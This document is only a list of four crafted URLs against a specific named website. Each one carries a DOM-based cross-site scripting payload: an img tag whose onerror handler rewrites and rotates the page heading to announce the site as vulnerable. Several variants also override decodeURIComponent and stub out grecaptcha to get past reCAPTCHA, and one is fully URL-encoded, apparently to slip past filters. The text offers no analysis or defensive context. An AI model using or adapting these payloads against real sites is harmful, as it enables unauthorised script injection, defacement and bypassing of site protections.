https://ismailman54.com/#<img src=x onerror="
    var h1 = $('h1');
    h1.text('💀 VULNÉRABLE XSS 💀').css({color:'red', transition:'all 0.5s'});
    
    setInterval(function() {
        h1.css('transform', 'rotate(' + (Date.now() / 25 % 360) + 'deg)');
    }, 50);
">

https://ismailman54.com/#<img src=x onerror="
    // Ignorer reCAPTCHA
    try { window.decodeURIComponent = x => x; } catch(e) {}
    
    // Code principal avec timeout
    setTimeout(function() {
        $('h1').text('💀 VULNÉRABLE XSS 💀').css({
            'color': 'red', 
            'transition': 'all 0.5s'
        });
        
        let angle = 0;
        setInterval(function() {
            angle = (angle + 2) % 360;
            $('h1').css('transform', 'rotate(' + angle + 'deg)');
        }, 50);
    }, 1000);
">

https://ismailman54.com/#<img src=x onerror="
   var h1 = $('h1');
    h1.text('💀 VULNÉRABLE XSS 💀').css({color:'red', transition:'all 0.5s'});
    
    setInterval(function() {
        h1.css('transform', 'rotate(' + (Date.now() / 25 % 360) + 'deg)');
    }, 50);
    // OBFUSCATION DU BYPASS
    var d=window.decodeURIComponent;window.decodeURIComponent=function(s){try{return d(s)}catch(e){return s}};
    var g=window.grecaptcha;window.grecaptcha={ready:function(c){c()}};
    
    // PAYLOAD OBFUSQUÉ
    setTimeout(function(){
        var t=$('h1');t.text('🔓 BYPASS RÉUSSI').css({color:'red',transition:'0.5s'});
        var a=0;setInterval(function(){a+=2;t.css('transform','rotate('+a%360+'deg)')},50);
    },200);
 
">

https://ismailman54.com/#%3Cimg%20src%3Dx%20onerror%3D%22%2F%2F%20Ignorer%20reCAPTCHA%0A%20%20%20%20try%20%7B%20window.decodeURIComponent%20%3D%20x%20%3D%3E%20x%3B%20%7D%20catch(e)%20%7B%7D%0A%20%20%20%20%0A%20%20%20%20%2F%2F%20Code%20principal%20avec%20timeout%0A%20%20%20%20setTimeout(function()%20%7B%0A%20%20%20%20%20%20%20%20%24('h1').text('%F0%9F%92%80%20VULN%C3%89RABLE%20XSS%20%F0%9F%92%80').css(%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20'color'%3A%20'red'%2C%20%0A%20%20%20%20%20%20%20%20%20%20%20%20'transition'%3A%20'all%200.5s'%0A%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20let%20angle%20%3D%200%3B%0A%20%20%20%20%20%20%20%20setInterval(function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20angle%20%3D%20(angle%20%2B%202)%20%25%20360%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24('h1').css('transform'%2C%20'rotate('%20%2B%20angle%20%2B%20'deg)')%3B%0A%20%20%20%20%20%20%20%20%7D%2C%2050)%3B%0A%20%20%20%20%7D%2C%201000)%3B%22%3E